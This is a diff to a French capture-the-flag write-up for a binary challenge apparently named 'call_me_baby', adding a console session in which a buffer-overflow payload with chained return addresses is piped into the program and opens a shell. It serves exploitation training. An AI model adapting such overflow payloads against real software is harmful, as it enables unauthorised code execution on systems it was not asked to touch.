@@ -404,7 +404,18 @@ error in re-setting breakpoint 5: no symbol "gadgets" in current context.
 [inferior 1 (process 6806) exited normally]
 ```
 
-Le programme essaie de lancer un nouveau process, on a donc réussi à passer la condition. le payload final est `"\x41"*64+"\x62\x61\x62\x79"+"\x00"*4+b"\x66\x11\x40\x00"+"\x00"*4+b"\x8a\x11\x40\x00"+"\x00"*4`.
+On arrive bien au message de succès mais le programme plante en essayant de lancer le shell. Testons le payload directement sur l'executable :
+
+```console
+$ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x62\x61\x62\x79"+b"\x00"*4+b"\x66\x11\x40\x00"+b"\x00"*4+b"\x8a\x11\x40\x00"+b"\x00"*4)' ; tee) | ./call_me_baby
+Write your love letter: 
+whoami
+coucou
+ls
+README.md  call_me_baby  exploit.py
+```
+
+Le payload final est donc `"\x41"*64+"\x62\x61\x62\x79"+"\x00"*4+b"\x66\x11\x40\x00"+"\x00"*4+b"\x8a\x11\x40\x00"+"\x00"*4`.
 
 ## Solution 2
 
